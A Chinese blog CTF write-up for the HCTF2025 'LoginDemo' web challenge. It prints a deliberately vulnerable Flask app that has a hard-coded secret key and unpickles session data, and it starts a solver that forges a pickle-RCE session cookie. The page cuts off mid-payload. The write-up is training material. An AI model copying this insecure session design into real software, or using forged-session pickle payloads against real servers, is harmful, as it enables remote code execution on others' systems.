@@ -1,0 +1,1020 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/chongqing.jpg">
+  <link rel="icon" href="/img/chongqing.jpg">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="sangnigege">
+  <meta name="keywords" content="一个做事不将就的人，阻止他的只有时间">
+  
+    <meta name="description" content="LoginDemo题目介绍 123matrix写了一个登录界面，但是大意的他留下了很多敏感的东西，该如何信息收集呢**题目容器开启后，若显示连接失败，请刷新网页，不需要重新开启容器**  本题考点：  常见信息收集之目录扫描 pickle反序列化 session伪造   模拟情景：泄露登录逻辑以及采用的不安全的认证机制（pickle），导致的任意代码执行 题目评析： 包含session伪造考点，用">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HCTF2025新生赛">
+<meta property="og:url" content="http://example.com/2026/test34/index.html">
+<meta property="og:site_name" content="重庆森林不在重庆">
+<meta property="og:description" content="LoginDemo题目介绍 123matrix写了一个登录界面，但是大意的他留下了很多敏感的东西，该如何信息收集呢**题目容器开启后，若显示连接失败，请刷新网页，不需要重新开启容器**  本题考点：  常见信息收集之目录扫描 pickle反序列化 session伪造   模拟情景：泄露登录逻辑以及采用的不安全的认证机制（pickle），导致的任意代码执行 题目评析： 包含session伪造考点，用">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152148037.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152148616.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152148606.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152148573.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152148992.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152148166.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152148141.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152148801.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152148134.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152149670.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152149723.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152149785.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152149854.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152149833.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152149471.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152149143.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152149054.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152149705.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152149180.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152149681.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152149203.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152149593.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152149912.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152149487.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152149163.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152149276.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152149101.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152149115.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152149944.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152149067.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152149769.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152149522.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152149476.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152149988.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152149640.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152149045.png">
+<meta property="article:published_time" content="2026-04-15T10:27:20.741Z">
+<meta property="article:modified_time" content="2026-04-15T13:49:55.584Z">
+<meta property="article:author" content="sangnigege">
+<meta property="article:tag" content="办赛">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152148037.png">
+  
+  
+  
+  <title>HCTF2025新生赛 - 重庆森林不在重庆</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":false},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":"TKccC2BvrQ0jKroA5aUdv8tr-gzGzoHsz","app_key":"rSHs3EnI9lT7nQwv5J7fcBnq","server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>重庆森林不在重庆</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="HCTF2025新生赛"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2026-04-15 18:27" pubdate>
+          2026年4月15日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          5.6k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          47 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="leancloud-page-views"></span> 次
+        </span>
+        
+      
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">HCTF2025新生赛</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="LoginDemo"><a href="#LoginDemo" class="headerlink" title="LoginDemo"></a>LoginDemo</h1><p>题目介绍</p>
+<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">matrix</span>写了一个登录界面，但是大意的他留下了很多敏感的东西，该如何信息收集呢<br><br><span class="hljs-comment">**题目容器开启后，若显示连接失败，请刷新网页，不需要重新开启容器**</span><br></code></pre></td></tr></table></figure>
+
+<p>本题考点：</p>
+<ul>
+<li>常见信息收集之目录扫描</li>
+<li>pickle反序列化</li>
+<li>session伪造</li>
+</ul>
+<blockquote>
+<p>模拟情景：泄露登录逻辑以及采用的不安全的认证机制（pickle），导致的任意代码执行</p>
+<p>题目评析：</p>
+<p>包含session伪造考点，用于引导学习flask中的session机制，及常见的key泄露方法：包括但不限于文件读取（<code>/proc/self/environ</code>或者<code>/proc/1/environ</code>）、源码泄露（app.py或者config.py等）、暴力破解、内存窃取……为后续学习flask安全问题提供入手点</p>
+<p>包含pickle考点，用于引导学习pickle反序列化机制、pickle反序列化漏洞成因，为后续学习pickle VM、find_class绕过、pickle opcode提供入手点</p>
+</blockquote>
+<p>dirsearch目录遍历，发现&#x2F;robots.txt</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152148037.png" srcset="/img/loading.gif" lazyload alt="image-20250821163433996"></p>
+<p>访问&#x2F;robots.txt，发现可疑目录</p>
+<figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs nix"><span class="hljs-params">User-agent:</span> <span class="hljs-operator">*</span><br><span class="hljs-params">Disallow:</span> <span class="hljs-symbol">/SourceOfWebsite</span><br><span class="hljs-params">Disallow:</span> <span class="hljs-operator">/</span>admin<br></code></pre></td></tr></table></figure>
+
+<p>访问&#x2F;admin，发现Not Found（骗你的，根本没有admin目录，这只是一个demo</p>
+<p>访问&#x2F;SourceOfWebsite，给源码了</p>
+<p>这里解释一下为什么要设置&#x2F;admin路由：</p>
+<p>第一，这是demo，是一个login演示示例，功能是不完善的，我根本没写admin页面</p>
+<p>第二，骗ai，如果只是复制了给ai看，做搬运工，ai会给你喝一壶的，你需要分辨ai说的是否正确、是否有用。</p>
+<p>注意，这里并不是故意设置障碍，你有无数种方法避开admin思路：</p>
+<ul>
+<li>如果你了解了robots.txt，然后尝试访问&#x2F;admin，会发现根本不存在，动手就可以排除</li>
+<li>如果你用dirsearch，了解目录扫描这个东西，那你会发现dirseach根本没扫出&#x2F;admin，但是这种工具一定会扫描这种常规路由，没扫出来，说明肯定没有</li>
+<li>而且，实际上&#x2F;SourceOfWebsite给了这个网站的代码，如果你不懂，可以让ai解释，他会发现根本没写admin路由。</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request, render_template, redirect, session, url_for, send_file<br><span class="hljs-keyword">import</span> sqlite3<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> binascii <span class="hljs-keyword">import</span> a2b_base64, b2a_base64<br><span class="hljs-keyword">import</span> pickle<br><br>DATABASE = <span class="hljs-string">&#x27;db.sqlite3&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_db</span>():<br>    conn = sqlite3.connect(DATABASE)<br>    conn.row_factory = sqlite3.Row<br>    <span class="hljs-keyword">return</span> conn<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">init_db</span>():<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.exists(DATABASE):<br>        conn = get_db()<br>        cur = conn.cursor()<br>        cur.execute(<span class="hljs-string">&#x27;CREATE TABLE users (id INTEGER PRIMARY KEY AUTOINCREMENT, username TEXT UNIQUE, password TEXT)&#x27;</span>)<br>        conn.commit()<br>        conn.close()<br><br><span class="hljs-comment"># init_db()</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, username, password, signature=<span class="hljs-literal">None</span></span>):<br>        <span class="hljs-variable language_">self</span>.username = username<br>        <span class="hljs-variable language_">self</span>.password = password<br>        <span class="hljs-variable language_">self</span>.signature = signature <span class="hljs-keyword">or</span> <span class="hljs-string">&quot;这个人很懒，什么都没有写。&quot;</span><br><br>app = Flask(__name__)<br>app.secret_key = <span class="hljs-string">&quot;immatrix&quot;</span><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;user&#x27;</span> <span class="hljs-keyword">in</span> session:<br>        <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;center&#x27;</span>))<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;index.html&#x27;</span>)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/register&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">register</span>():<br>    username = request.form.get(<span class="hljs-string">&#x27;username&#x27;</span>)<br>    password = request.form.get(<span class="hljs-string">&#x27;password&#x27;</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> username <span class="hljs-keyword">or</span> <span class="hljs-keyword">not</span> password:<br>        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;index.html&#x27;</span>, reg_error=<span class="hljs-string">&quot;请填写用户名和密码&quot;</span>, login_error=<span class="hljs-literal">None</span>)<br>    conn = get_db()<br>    cur = conn.cursor()<br>    cur.execute(<span class="hljs-string">&quot;SELECT * FROM users WHERE username = ?&quot;</span>, (username,))<br>    <span class="hljs-keyword">if</span> cur.fetchone():<br>        conn.close()<br>        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;index.html&#x27;</span>, reg_error=<span class="hljs-string">&quot;用户名已存在&quot;</span>, login_error=<span class="hljs-literal">None</span>)<br>    cur.execute(<span class="hljs-string">&quot;INSERT INTO users (username, password) VALUES (?, ?)&quot;</span>, (username, password))<br>    conn.commit()<br>    conn.close()<br>    <span class="hljs-comment"># 注册后自动登录，存储序列化User对象到session</span><br>    user_obj = User(username, password)<br>    session[<span class="hljs-string">&#x27;user&#x27;</span>] = b2a_base64(pickle.dumps(user_obj)).decode()<br>    <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;center&#x27;</span>))<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/login&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">login</span>():<br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;GET&#x27;</span>:<br>        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;login.html&#x27;</span>)<br>    username = request.form.get(<span class="hljs-string">&#x27;username&#x27;</span>)<br>    password = request.form.get(<span class="hljs-string">&#x27;password&#x27;</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> username <span class="hljs-keyword">or</span> <span class="hljs-keyword">not</span> password:<br>        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;login.html&#x27;</span>, login_error=<span class="hljs-string">&quot;请填写用户名和密码&quot;</span>)<br>    conn = get_db()<br>    cur = conn.cursor()<br>    cur.execute(<span class="hljs-string">&quot;SELECT * FROM users WHERE username = ? AND password = ?&quot;</span>, (username, password))<br>    row = cur.fetchone()<br>    conn.close()<br>    <span class="hljs-keyword">if</span> row:<br>        user_obj = User(username, password)<br>        session[<span class="hljs-string">&#x27;user&#x27;</span>] = b2a_base64(pickle.dumps(user_obj)).decode()<br>        <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;center&#x27;</span>))<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;login.html&#x27;</span>, login_error=<span class="hljs-string">&quot;用户名或密码错误&quot;</span>, reg_error=<span class="hljs-literal">None</span>)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/logout&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">logout</span>():<br>    session.clear()<br>    <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;index&#x27;</span>))<br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/center&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">center</span>():<br><br>    user_data = session.get(<span class="hljs-string">&#x27;user&#x27;</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> user_data:<br>        <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;index&#x27;</span>))<br>    <span class="hljs-comment"># else:</span><br>    <span class="hljs-comment">#     data = a2b_base64(user_data)</span><br>    <span class="hljs-comment">#     result = pickle.loads(data)</span><br>    <span class="hljs-comment">#     return result</span><br>    <span class="hljs-keyword">try</span>:<br>        user_obj = pickle.loads(a2b_base64(user_data))<br>        <span class="hljs-comment"># 只显示用户信息，不再处理个性签名修改</span><br>        <span class="hljs-keyword">if</span> user_obj <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;User is null. Check your session.&#x27;</span><br>        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;center.html&#x27;</span>, username=<span class="hljs-built_in">getattr</span>(user_obj, <span class="hljs-string">&#x27;username&#x27;</span>, <span class="hljs-string">&#x27;未知用户&#x27;</span>), signature=<span class="hljs-built_in">getattr</span>(user_obj, <span class="hljs-string">&#x27;signature&#x27;</span>, user_obj))<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">f&quot;Exception: <span class="hljs-subst">&#123;<span class="hljs-built_in">str</span>(e)&#125;</span>&quot;</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/robots.txt&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">robots</span>():<br>    <span class="hljs-keyword">return</span> send_file(<span class="hljs-string">&#x27;robots.txt&#x27;</span>)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/SourceOfWebsite&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">source</span>():<br>    <span class="hljs-keyword">return</span> send_file(<span class="hljs-string">&#x27;app.py&#x27;</span>)<br><br><br><br><span class="hljs-comment"># if __name__ == &#x27;__main__&#x27;:</span><br><span class="hljs-comment">#     init_db()</span><br><span class="hljs-comment">#     app.run(host=&#x27;0.0.0.0&#x27;, port=8000, debug=False)</span><br></code></pre></td></tr></table></figure>
+
+<p>源码审计，这里有两个重点</p>
+<ul>
+<li>看到pickle要注意，pickle反序列化是机制上的安全问题，可以任意构造对象去反序列化（无过滤的话），因此可以实现任意代码执行</li>
+<li><code>app.secret_key = &quot;immatrix&quot;</code>，给了session伪造的key，可以session伪造</li>
+</ul>
+<p>读懂登录逻辑、了解session结构之后，题目就很清晰了</p>
+<p>这里随便注册一个账号</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152148616.png" srcset="/img/loading.gif" lazyload alt="image-20250821164807831"></p>
+<p>解题脚本如下，（关键点在于把pickle放session的user里，以及pickle反序列化的应用）</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">作者: matrix</span><br><span class="hljs-string">对应题目: LoginDemo</span><br><span class="hljs-string"></span><br><span class="hljs-string">功能说明:</span><br><span class="hljs-string">本脚本用于CTF题目LoginDemo的解题，主要包括：</span><br><span class="hljs-string">1. 构造pickle反序列化RCE payload并base64编码</span><br><span class="hljs-string">2. 生成包含payload的Flask session cookie</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br><span class="hljs-comment"># 注意要下载对应的包</span><br><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">from</span> binascii <span class="hljs-keyword">import</span> a2b_base64, b2a_base64<br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask<br><br><span class="hljs-comment"># 1. 生成 payload</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Rce</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">return</span> (<span class="hljs-built_in">eval</span>, (<span 